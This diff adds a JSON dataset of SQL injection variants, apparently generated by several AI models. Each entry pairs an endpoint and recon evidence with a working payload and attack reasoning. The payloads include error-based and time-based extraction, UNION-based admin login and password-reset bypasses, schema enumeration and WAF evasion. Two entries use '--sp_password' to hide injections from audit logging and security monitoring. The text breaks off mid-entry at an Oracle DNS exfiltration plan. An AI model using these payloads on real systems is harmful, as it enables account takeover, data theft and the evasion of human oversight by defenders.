@@ -1,0 +1,2450 @@
+[
+ {
+  "class": "sqli",
+  "batch": "sqli_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /catalog/item/detail?sku=AX-1043",
+   "target_param": "sku",
+   "recon_evidence": "Appending a single quote to sku=AX-1043 renders 'DatabaseException: unrecognized token: \"''' java-style wrapper around a MySQL syntax message near '''.",
+   "planner_rationale": "Raw DBMS exception on quote confirms unprepared string concatenation and keeps the fingerprint MySQL, so proceed with MySQL syntax only.",
+   "vuln_class": "sqli",
+   "payload": "'",
+   "injection_point": "query",
+   "expected_success_signal": "Stack trace containing SQLSTATE HY000 / MySQL syntax error fragment echoed into the HTML error section",
+   "confidence": 0.9,
+   "reasoning": "The quote terminates the sku string literal mid-query and the framework surfaces the unhandled driver exception verbatim, proving both injection and the MySQL backend before any deeper payload is attempted."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "POST /api/ratings/summary",
+   "target_param": "product_ref",
+   "recon_evidence": "product_ref=12' yields a 200 page whose rating chart silently disappears, while removing the quote restores it; no error text is returned in either case.",
+   "planner_rationale": "Error output is suppressed but a boolean slot exists around the numeric ref; fingerprint the DBMS via a harmless MySQL-only TRUE expression.",
+   "vuln_class": "sqli",
+   "payload": "conv('a',16,2)=conv('a',16,2)",
+   "injection_point": "body",
+   "expected_success_signal": "Rating chart renders in the response body only because the injected condition evaluates TRUE on MySQL",
+   "confidence": 0.7,
+   "reasoning": "The boolean differential observed on the single-quote probe shows the appended string reaches a WHERE clause, and conv() with base-16 to base-2 conversion is MySQL-specific, so a silently TRUE page acts as a DBMS oracle without needing error output."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /account/history?filter=purchases",
+   "target_param": "filter",
+   "recon_evidence": "Injections in filter alter nothing visible: input is never reflected and quote probes return identical static pages; response headers include X-Backend: mariadb-mysql.",
+   "planner_rationale": "No reflection and no boolean differential despite confirmed concatenation, so probe execution with a time-based side channel.",
+   "vuln_class": "sqli",
+   "payload": "1 AND SLEEP(5)",
+   "injection_point": "query",
+   "expected_success_signal": "Response for the filter request arrives approximately five seconds later than the unmodified baseline request",
+   "confidence": 0.85,
+   "reasoning": "With reflection and boolean channels ruled out, the MySQL-identified backend executing the concatenated expression stalls on SLEEP(5), turning the wall-clock delay into the confirmation oracle the recon evidence demands."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /support/ticket?category=hardware",
+   "target_param": "category",
+   "recon_evidence": "category value drives whether ticket rows appear; appending the boolean slot payload without a closing context caused no change and category accepts only trailing numerics on the normal path; headers show X-Server-DB: mysql-8.",
+   "planner_rationale": "Boolean-controlled row visibility on a fingerprinted MySQL backend justifies the silent conv() fingerprint to separate TRUE-TRUE from FALSE-FALSE differentials.",
+   "vuln_class": "sqli",
+   "payload": "conv('a',16,2)=conv('a',16,2)",
+   "injection_point": "query",
+   "expected_success_signal": "Ticket list section renders fully because the conv() condition evaluates TRUE and preserves the WHERE branch on MySQL",
+   "confidence": 0.75,
+   "reasoning": "The category slot already gates visible output, and because SLEEP-style delays are rate-limited here the MySQL-only conv comparison acts as a non-blocking boolean oracle that the row-injection context is evaluating our appended expression."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /api/v2/telemetry/events",
+   "target_param": "since",
+   "recon_evidence": "Injecting `since=1 AND 5::int=5` returns the same page as `since=1` while `since=1 AND 5::int=6` returns an empty result set, confirming a blind PostgreSQL boolean oracle; `pg_sleep` and `SLEEP` are both rejected and no SQL error text is ever reflected.",
+   "planner_rationale": "Boolean oracle plus PostgreSQL dialect and zero error reflection means the delay must be self-contained inside the WHERE clause without any SLEEP-family function.",
+   "vuln_class": "sqli",
+   "payload": "1 AND 1337=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))",
+   "injection_point": "query",
+   "expected_success_signal": "Boolean-true response body arrives after a reproducible multi-second pause that scales when the series upper bound is enlarged",
+   "confidence": 0.9,
+   "reasoning": "The confirmed `5::int` tautology pins the backend as PostgreSQL, and because SLEEP is filtered out of this build, GENERATE_SERIES(1,5000000) gives a pure-SQL busy-wait whose cost is proportional to row count. Comparing the response time against `since=1` isolates the delay as query-driven rather than network jitter."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "POST /api/v1/warehouse/stock/search",
+   "target_param": "warehouse_code",
+   "recon_evidence": "The JSON body filter `{\"warehouse_code\":\"2 AND 1=1\"}` returns the full stock list, `{\"warehouse_code\":\"2 AND 1=2\"}` returns none, and a 6-second latency was observed when a nested aggregate subquery was supplied; the DBMS banner in the `/health` endpoint advertises PostgreSQL 13.",
+   "planner_rationale": "Same blind PostgreSQL condition-injection point moves into the JSON body filter, so a stacked-free time-based COUNT over GENERATE_SERIES should confirm and then widen the oracle.",
+   "vuln_class": "sqli",
+   "payload": "1 AND 1337=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))",
+   "injection_point": "body",
+   "expected_success_signal": "The stock search responds successfully after several seconds instead of instantly, with latency growing when the series bound is raised",
+   "confidence": 0.86,
+   "reasoning": "The body filter already behaves as a boolean oracle against a confirmed PostgreSQL 13 backend, so the numeric context accepts the same AND expression verbatim. Replacing the tautology with the GENERATE_SERIES COUNT converts the boolean channel into a timing channel without relying on any error output."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /storefront/catalog/item",
+   "target_param": "sku",
+   "recon_evidence": "`sku=25'` produces `You have an error in your SQL syntax near ''25'''` echoed in the response body, and a subsequent `sku=25 AND 1=1` versus `sku=25 AND 1=2` pair flips the product result, confirming MySQL string/numeric injection with full error reflection.",
+   "planner_rationale": "Reflected MySQL syntax errors plus a live result flip mean the fastest exfil path is a single-request error-based dump via the XPATH message channel.",
+   "vuln_class": "sqli",
+   "payload": "1 AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~'))",
+   "injection_point": "query",
+   "expected_success_signal": "An `XPATH syntax error: '~<version string>~'` message appears in the item page body",
+   "confidence": 0.88,
+   "reasoning": "The reflected MySQL syntax error tells us the error string is rendered to the client, which is exactly the precondition EXTRACTVALUE needs to smuggle data out of a malformed XPath argument. The `~` delimiters make the leaked version trivially parseable out of the noisy error text."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /checkout/basket/summary",
+   "target_param": "cart_id",
+   "recon_evidence": "The `cart_id` cookie is used directly in a basket lookup: `cart_id=77'` returns a generic 500 page, while `cart_id=77 AND 1=1` and `cart_id=77 AND 1=2` return different basket totals, but error text is suppressed on this route compared with the item page.",
+   "planner_rationale": "The cookie is injectable and MySQL-flavoured but this handler hides raw errors, so try the XPATH error channel and treat the presence of the error string itself as the signal.",
+   "vuln_class": "sqli",
+   "payload": "1 AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~'))",
+   "injection_point": "cookie",
+   "expected_success_signal": "A 500 response containing `XPATH syntax error` with the `~<version>~` delimiters, where the identical request without EXTRACTVALUE returns the plain error page",
+   "confidence": 0.72,
+   "reasoning": "The AND-based result flip proves MySQL string context injection through the cookie, but because this handler replaces SQL errors with a generic 500 the leak depends on the DBMS error leaking past the application's exception handler. The version-bearing XPATH message is the discriminator against the baseline 500."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /api/v1/analytics/report",
+   "target_param": "X-Report-Filter",
+   "recon_evidence": "The custom `X-Report-Filter` header is interpolated into a WHERE clause: `X-Report-Filter: region=EU` works, `X-Report-Filter: region=EU\" AND 5::int=5\"` returns the same rows, and the middleware surfaces raw PostgreSQL `invalid input syntax for type numeric` errors from this route.",
+   "planner_rationale": "PostgreSQL backend with numeric cast errors echoed back on this route makes error-based exfiltration via CAST the highest-yield single-request primitive.",
+   "vuln_class": "sqli",
+   "payload": "1 AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC)",
+   "injection_point": "header",
+   "expected_success_signal": "`ERROR: invalid input syntax for type numeric: \"~PostgreSQL ...~\"` returned in the response body",
+   "confidence": 0.8,
+   "reasoning": "The reflected PostgreSQL numeric-cast errors prove the offending literal is echoed verbatim, and the confirmed `5::int` tautology fixes the dialect. Wrapping `version()` in `~` markers inside the CAST guarantees the value appears intact inside the error text for easy extraction."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /dashboard",
+   "target_param": "sort_col (cookie)",
+   "recon_evidence": "Session cookie 'sort_col' is concatenated into an ORDER BY clause; MySQL error text is returned verbatim in the page; column count of the underlying view is undocumented.",
+   "planner_rationale": "Enumerate the ORDER BY column count through the cookie vector before constructing any UNION payload.",
+   "vuln_class": "sqli",
+   "payload": "1 ORDER BY 4-- ",
+   "injection_point": "cookie",
+   "expected_success_signal": "Unknown column '4' in 'order clause' error while ORDER BY 3 rendered the dashboard normally",
+   "confidence": 0.78,
+   "reasoning": "A cookie-sourced value interpolated into ORDER BY behaves identically to a query-string probe: out-of-range indexes raise 'Unknown column', revealing the last valid index as the column count."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "POST /api/transfer",
+   "target_param": "account_id",
+   "recon_evidence": "JSON body field 'account_id' is coerced into a numeric SQL context; MySQL error strings are surfaced to the client on validation failure; users table already enumerated.",
+   "planner_rationale": "Use error-based extraction on the numeric body parameter to recover users-table column names without needing a UNION slot.",
+   "vuln_class": "sqli",
+   "payload": "1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=users LIMIT 0,1)))",
+   "injection_point": "body",
+   "expected_success_signal": "Error response embedding XPATH syntax error: ~<column_name>~ in the reflected MySQL message",
+   "confidence": 0.72,
+   "reasoning": "EXTRACTVALUE forces the subquery result into a MySQL error string, which this endpoint reflects; because only one LIMIT-ed row can fit per error, each request recovers one column and the offset must be incremented to enumerate them all."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_3",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "POST /api/v1/auth/login",
+   "target_param": "login",
+   "recon_evidence": "A single quote in the login field returned MySQL error 1064; appending ' AND 1=1' returned 'invalid credentials' while ' AND 1=0' returned 'no such user', and ORDER BY 2 succeeded while ORDER BY 3 failed, fixing the projection at two columns (username, md5_password) compared via md5(submitted password).",
+   "planner_rationale": "Null out the real admin row and UNION a username/hash pair of my own so the md5 comparison passes without the real password.",
+   "vuln_class": "sqli",
+   "payload": "admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--",
+   "injection_point": "body",
+   "expected_success_signal": "Response carries an authenticated session/cookie for the admin account, and the app accepts the password whose MD5 equals the planted hash",
+   "confidence": 0.88,
+   "reasoning": "The leading quote closes the literal after admin, the false branch removes the genuine row so only the UNION branch survives, and the two injected values land exactly in the username and md5_password slots proven by the ORDER BY probe. The trailing -- comments out the closing quote and any trailing SQL."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_3",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /account/recovery/verify",
+   "target_param": "email",
+   "recon_evidence": "verify?email= returns {\"found\":true,\"challenge\":\"<md5>\"} for real addresses and found:false otherwise; an appended quote produced an SQL syntax error, the AND 1=1 / AND 1=0 pair flipped found, and ORDER BY 2 was the last column that did not error, so the query projects exactly email and md5_password.",
+   "planner_rationale": "Make the account-recovery lookup return an admin row carrying a hash I control so the challenge comparison succeeds and the reset flow unlocks that account.",
+   "vuln_class": "sqli",
+   "payload": "admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--",
+   "injection_point": "query",
+   "expected_success_signal": "Endpoint reports found:true for the admin account and issues a reset challenge bound to the planted hash, allowing the password reset to be completed",
+   "confidence": 0.82,
+   "reasoning": "The value closes the string literal opened before the parameter, the false condition guarantees the legitimate admin record is not the one returned, and the UNION supplies a well-formed (email, md5) pair for the handler's two-column check. Commenting the tail with -- absorbs the orphaned quote so the statement stays syntactically valid."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_3",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /admin/console",
+   "target_param": "uid",
+   "recon_evidence": "The uid session cookie feeds SELECT uid, token FROM sessions WHERE uid='$uid'; swapping in a quote produced an unclosed-quotation error, ORDER BY 2 succeeded while ORDER BY 3 failed, and uid=admin' AND 1=0 returned the logged-out page whereas the1=1 form returned the console HTML.",
+   "planner_rationale": "UNION a synthetic session row with uid 'admin' and a token equal to the hash the console later validates, so the admin view renders off a value I chose.",
+   "vuln_class": "sqli",
+   "payload": "admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--",
+   "injection_point": "cookie",
+   "expected_success_signal": "GET /admin/console returns the authenticated admin dashboard instead of the logged-out redirect, with the resolved session row showing uid 'admin'",
+   "confidence": 0.78,
+   "reasoning": "The session resolver concatenates the cookie unsanitised into a two-column lookup, so the injected quote plus false branch discards any real session and the UNION fabricates one whose token equals the value the page compares against. Confidence is held slightly below the login case because the exact column order and the console's token check were inferred from probing rather than read directly."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_3",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /search/orders?orderId=1",
+   "target_param": "orderId",
+   "recon_evidence": "orderId is concatenated into SELECT ... WHERE OrderNo = @p on a string column with no CAST: a trailing quote caused 'Incorrect syntax near', orderId=1 AND 1=0 returned an empty result set while 1 AND 1=1 returned the order, and @@VERSION already leaked Microsoft SQL Server 2019. Central audit is enabled and the SOC alerts on any statement containing a comment marker.",
+   "planner_rationale": "Run a true-condition boolean probe terminated by --sp_password so SQL Server neutralises the statement text in the audit trail while the query itself still executes.",
+   "vuln_class": "sqli",
+   "payload": "1 AND 1=1--sp_password",
+   "injection_point": "query",
+   "expected_success_signal": "Order 1 is returned in the results while the audit/SIEM event stores an obfuscated statement instead of the injected text, so the probe generates no usable signature for the SOC",
+   "confidence": 0.7,
+   "reasoning": "The always-true condition preserves the row the false-branch probe already proved controllable, and -- both removes the trailing quote and, because the text now contains sp_password, triggers SQL Server's audit-side neutralisation of the recorded statement. Confidence is moderate because the redaction depends on the server's audit/logging configuration rather than on the injection point itself."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_3",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /api/v1/customers/{customerRef}",
+   "target_param": "customerRef",
+   "recon_evidence": "The .NET route handler concatenates the segment into SELECT ... WHERE CustomerRef = '%s' on MSSQL: a trailing quote produced an Incorrect-syntax-near error from the global exception handler, the segment 1 AND 1=0 returned the not-found JSON while 1 AND 1=1 returned the customer object, and raw command text is shipped by that handler to the audit collector the SOC reviews.",
+   "planner_rationale": "Append sp_password after the line comment so the executed statement is obscured in the audit collector while the boolean probe result still reaches the response body.",
+   "vuln_class": "sqli",
+   "payload": "1 AND 1=1--sp_password",
+   "injection_point": "path",
+   "expected_success_signal": "Customer record is returned for the true-condition segment while the audit collector stores an obfuscated statement, so the probe is not raised as an injection alert",
+   "confidence": 0.66,
+   "reasoning": "The true-condition prefix keeps the row that the paired 1=0 probe proved is under boolean control, and the -- absorbs the handler's closing quote so the statement parses; in transit the spaces are percent-encoded, which does not alter the SQL the server executes. Confidence is the lowest here because it depends on both a routable path segment accepting the probe and on the deployment's log pipeline honouring the redaction."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "POST /intranet/getNoticeBoard",
+   "target_param": "res_id (form body)",
+   "recon_evidence": "res_id is a numeric key interpolated into WHERE res_id = ... and requests whose body parameters contain a space are rejected by the edge WAF with a generic 403 while DB errors are suppressed, leaving response timing as the only distinguishable channel.",
+   "planner_rationale": "Space-filtering WAF on a numeric body parameter - substitute /**/ for spaces and gate a SLEEP behind CASE WHEN for a blind boolean-time oracle.",
+   "vuln_class": "sqli",
+   "payload": "res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0",
+   "injection_point": "body",
+   "expected_success_signal": "The notice-board response returns after roughly 6 seconds exactly when LENGTH(version())=10 holds, while control probes such as =6 or =15 return instantly, giving a repeatable conditional-timing oracle.",
+   "confidence": 0.9,
+   "reasoning": "/**/ restores token separation without the filtered space, and wrapping SLEEP(6*1) in CASE WHEN makes the delay data-dependent, so a space-stripping WAF plus silent error handling still leaves a solvable blind oracle; the leading numeric 51- keeps the parameter syntactically numeric."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /shop/voucher/validate?voucher=SAVE20",
+   "target_param": "voucher (query string)",
+   "recon_evidence": "Appending a quote to voucher surfaces a stack trace reading WHERE (voucher='...') AND cart_active=1, and a valid code renders exactly one discount row, so the predicate sits inside a parenthesized quoted context.",
+   "planner_rationale": "Parenthesized quoted context - mirror the wrapper's own ')' and quote, then widen the result with an OR tautology.",
+   "vuln_class": "sqli",
+   "payload": "') OR ('1'='1",
+   "injection_point": "query",
+   "expected_success_signal": "Validation succeeds for arbitrary voucher strings and the response renders all active discount rows instead of the single row matching one code.",
+   "confidence": 0.9,
+   "reasoning": "The leading ') closes both the string literal and the wrapper's parenthesis, and the trailing ('1'='1 re-opens and re-closes a quote so the statement stays balanced; the always-true OR drops the voucher filter, and the widened row set is directly observable."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /archive/documents?cols=name",
+   "target_param": "cols (query string)",
+   "recon_evidence": "The handler builds SELECT {cols} FROM filelist verbatim against a SQLite store, and a stray quote appended to cols returns a 500 page echoing an SQLite compile error that reproduces the attacker text inside the SELECT.",
+   "planner_rationale": "Projection interpolated into the SELECT column list - close it with a quote and re-open the query body with FROM/ORDER BY; the echoed compile error proves control.",
+   "vuln_class": "sqli",
+   "payload": "' FROM filelist ORDER BY filename collate nocase asc",
+   "injection_point": "query",
+   "expected_success_signal": "SQLite 'unrecognized token' compile error echoing the injected fragment inside the compiled SELECT statement.",
+   "confidence": 0.85,
+   "reasoning": "The opening quote terminates the column-list position and the appended FROM filelist ORDER BY ... tokens are compiled raw, while the collate nocase clause matches the confirmed SQLite dialect; the echoed compile error simultaneously proves injection and serves as a debugging channel."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /admin/audit/log",
+   "target_param": "branch (Cookie header)",
+   "recon_evidence": "Row scoping is driven by a branch cookie; a malformed value triggers a debug response exposing WHERE (branch='EAST') AND owner_id=17, and editing the cookie visibly changes which audit rows are returned.",
+   "planner_rationale": "Cookie-driven parenthesized quoted scoping - keep the wrapper balanced and widen the scope with an OR tautology.",
+   "vuln_class": "sqli",
+   "payload": "') OR ('1'='1",
+   "injection_point": "cookie",
+   "expected_success_signal": "The audit listing returns entries for every branch rather than only the one encoded in the cookie, with no error or validation failure.",
+   "confidence": 0.8,
+   "reasoning": "The cookie value lands verbatim inside the parenthesized quoted predicate shown in the debug trace, so ') OR ('1'='1 mirrors the wrapper's parentheses and makes the branch filter always true, expanding the visible row scope; some frameworks re-encode cookie punctuation, which is the residual risk."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /api/vault/documents/export",
+   "target_param": "X-Fields (request header)",
+   "recon_evidence": "Altering X-Fields visibly changes the export columns, and a stray quote in the header yields an SQLite syntax-error 500 echoing the header value inside the rendered SELECT column list, indicating raw interpolation before execution.",
+   "planner_rationale": "Same projection breakout delivered through a client-controlled header that the export builder pastes into the SELECT column list.",
+   "vuln_class": "sqli",
+   "payload": "' FROM filelist ORDER BY filename collate nocase asc",
+   "injection_point": "header",
+   "expected_success_signal": "SQLite 'unrecognized token' compile error echoing the header-supplied fragment within the compiled SELECT, confirming the header reaches the statement unfiltered.",
+   "confidence": 0.7,
+   "reasoning": "The quote closes the interpolated column list and the FROM/ORDER BY sequence is compiled as live SQL, inherited from the same projection-interpolation mechanism observed via the echoed error; the header path is less commonly exercised, so confidence is deliberately lower pending direct delay/error confirmation."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_5",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /reports/sales/summary",
+   "target_param": "period",
+   "recon_evidence": "The period value is treated as a raw string inside a quoted WHERE clause; supplying 1'>'0 returned the full monthly totals table, and a lone single quote triggered a MySQL syntax error in the response.",
+   "planner_rationale": "Pair the confirmed TRUE probe with its documented FALSE control before driving further logic.",
+   "vuln_class": "sqli",
+   "payload": "0'>'1",
+   "injection_point": "query",
+   "expected_success_signal": "Empty or reduced response versus the true probe",
+   "confidence": 0.82,
+   "reasoning": "With the true probe 1'>'0 already returning the full totals table, reversing the comparison to 0'>'1 yields the false leg of the oracle; any content difference between the two confirms the period parameter governs quote-delimited query logic."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_5",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /api/v2/inventory/stock",
+   "target_param": "X-Store-Id",
+   "recon_evidence": "MSSQL confirmed via @@version error strings; the X-Store-Id header value is copied verbatim into the WHERE clause, and a trailing single quote produced a syntax error indicating the parameter terminates a string literal.",
+   "planner_rationale": "MSSQL backend confirmed; use the native timer to prove the header value reaches the query.",
+   "vuln_class": "sqli",
+   "payload": "1' WAITFOR DELAY '0:0:10",
+   "injection_point": "header",
+   "expected_success_signal": "Response delayed exactly 10 seconds",
+   "confidence": 0.86,
+   "reasoning": "The MSSQL timing table selects WAITFOR DELAY; a consistent 10-second pause on the header value confirms the leading quote closes a string literal and that the header reaches a stackable query context."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_5",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "POST /search/advanced",
+   "target_param": "query",
+   "recon_evidence": "The JSON body field sits in a quoted WHERE clause; a three-column result row was confirmed and the second column is echoed back in the JSON response, with MySQL confirmed by error fingerprinting.",
+   "planner_rationale": "Enumerate database names by reading the reflected second column.",
+   "vuln_class": "sqli",
+   "payload": "-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata",
+   "injection_point": "body",
+   "expected_success_signal": "Pipe-delimited list of all database names in the reflected column",
+   "confidence": 0.9,
+   "reasoning": "The verbatim mixed-casing payload matches the confirmed three-column shape and the reflected second slot, so GROUP_CONCAT collapses every schema name into the single field rendered back in the JSON response."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_5",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /account/preferences",
+   "target_param": "layout",
+   "recon_evidence": "The layout cookie value is placed into a quoted comparison; 1'>'0 returned the populated grid layout, while a lone single quote produced a MySQL syntax error, confirming the cookie value reaches the query unescaped.",
+   "planner_rationale": "Confirm the FALSE branch of the boolean oracle for the cookie-sourced value.",
+   "vuln_class": "sqli",
+   "payload": "0'>'1",
+   "injection_point": "cookie",
+   "expected_success_signal": "Default/empty layout or reduced content versus the true probe",
+   "confidence": 0.72,
+   "reasoning": "The layout cookie is concatenated into a quoted predicate, so 0'>'1 supplies the false leg; a content difference against the confirmed true probe proves the cookie value drives query logic rather than being validated client-side."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_5",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /store/product/{sku}",
+   "target_param": "sku",
+   "recon_evidence": "The path segment is inserted into a quoted WHERE clause; a negative value returned no product row, three result columns were confirmed, and the third column is reflected into the rendered detail page on MySQL.",
+   "planner_rationale": "Path segment is quote-injectable into the SELECT; enumerate schemas through the reflected third slot.",
+   "vuln_class": "sqli",
+   "payload": "-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata",
+   "injection_point": "path",
+   "expected_success_signal": "Pipe-delimited list of all database names in the reflected third column",
+   "confidence": 0.78,
+   "reasoning": "The verbatim three-column UNION payload matches the confirmed column count and targets the reflected third position, so the aggregated schema list surfaces directly in the product detail page despite the injection living in the path segment."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /catalog/filter",
+   "target_param": "category",
+   "recon_evidence": "Boolean blind oracle confirmed: category=1' AND '1'='1 returns the full listing while category=1' AND '1'='2 returns an empty result set; error messages are suppressed and no data is reflected.",
+   "planner_rationale": "Char-by-char SUBSTR against information_schema, exploiting the confirmed true/false page flip to extract table names without any error output.",
+   "vuln_class": "sqli",
+   "payload": "1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'",
+   "injection_point": "query",
+   "expected_success_signal": "TRUE/FALSE page flip per guessed character",
+   "confidence": 0.9,
+   "reasoning": "The observed true/false content differential matches the documented blind pattern, turning the listing page into a boolean oracle; iterating position and character extracts table names one letter at a time."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /orders/lookup",
+   "target_param": "order_id",
+   "recon_evidence": "MSSQL backend disclosed in stack trace on malformed input; classic +AND+1=@@version-- returns a 403 from the WAF, but numeric order_id values are interpolated directly and error messages are rendered to the page.",
+   "planner_rationale": "Alternative error vector via string concatenation with a conversion function, sidestepping the blocked +AND+1=@@version-- shape.",
+   "vuln_class": "sqli",
+   "payload": "1'%2buser_name(@@version)--",
+   "injection_point": "query",
+   "expected_success_signal": "Conversion error message containing the concatenated value",
+   "confidence": 0.85,
+   "reasoning": "The MSSQL error-rendering channel plus WAF blocking of the classic concatenation shape selects the %2b string-concatenation trick: concatenating USER_NAME() with @@version forces a type-conversion error that leaks the value."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /api/v2/products",
+   "target_param": "sort",
+   "recon_evidence": "sort parameter is reflected into an ORDER BY clause: sort=id works, sort=id,(SELECT 1) is accepted, and sort=id-- yields a 500 indicating the trailing quote is not quoted; page flips between full and empty result sets for true/false conditions.",
+   "planner_rationale": "Confirmed boolean blind in ORDER BY context; use SUBSTR against information_schema to enumerate schema character by character.",
+   "vuln_class": "sqli",
+   "payload": "1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'",
+   "injection_point": "query",
+   "expected_success_signal": "TRUE/FALSE page flip per guessed character",
+   "confidence": 0.88,
+   "reasoning": "The observed acceptance of a subquery in the ORDER BY position and the true/false result-set differential confirm a boolean blind oracle; SUBSTR on information_schema.tables extracts table names one character at a time."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "POST /admin/report/generate",
+   "target_param": "report_id",
+   "recon_evidence": "MSSQL backend; WAF rejects strings containing @@version and AND 1=1 in the body, but report_id is a numeric field whose conversion errors are returned verbatim in the JSON response.",
+   "planner_rationale": "Bypass the @@version/AND WAF signatures by leaking version via a conversion error built from string concatenation instead of the classic comparison.",
+   "vuln_class": "sqli",
+   "payload": "1'%2buser_name(@@version)--",
+   "injection_point": "body",
+   "expected_success_signal": "Conversion error message containing the concatenated value",
+   "confidence": 0.8,
+   "reasoning": "The numeric body parameter renders MSSQL conversion errors verbatim while the WAF blocks the classic version probe, so concatenating USER_NAME() with @@version using %2b forces a conversion error that leaks the version string."
+  }
+ },
+ {
+  "class": "sqli",
+  "batch": "sqli_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /internal/metrics/healthcheck",
+   "target_param": "X-Request-Source",
+   "recon_evidence": "Oracle back end returning ORA-01756 quoted-string errors on malformed values; production network permits no outbound TCP or ICMP, DNS resolution is the only egress; the request filter normalizes query and body values but passes header values through verbatim; banner-sized data must leave in 20-byte chunks.",
+   "planner_rationale": "Out-of-band is the only channel left, so use UTL_INADDR.GET_HOST_ADDRESS with LOWER(RAWTOHEX(...)) to hex-encode a 20-byte slice of v$version.banner into a DNS-safe label with a sequence index.",
+   "vuln_class": "sqli",
